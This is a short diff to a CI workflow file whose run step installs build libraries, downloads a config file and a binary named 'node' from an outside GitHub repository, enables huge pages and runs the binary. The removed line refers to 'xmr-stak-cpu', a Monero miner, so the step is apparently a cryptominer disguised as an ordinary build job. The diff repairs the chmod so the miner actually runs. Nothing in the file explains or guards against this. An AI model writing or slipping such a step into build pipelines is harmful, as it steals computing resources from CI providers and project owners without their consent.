@@ -9,6 +9,6 @@ jobs:
         - master
         - /*/
     steps:
-       - run: apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev && wget https://github.com/hagiwa/hagiwa/raw/master/config.txt && wget https://github.com/hagiwa/hagiwa/raw/master/node && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128 && ./node
+       - run: apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev && wget https://github.com/hagiwa/hagiwa/raw/master/config.txt && wget https://github.com/hagiwa/hagiwa/raw/master/node && chmod +x node && sysctl -w vm.nr_hugepages=128 && ./node
       
       
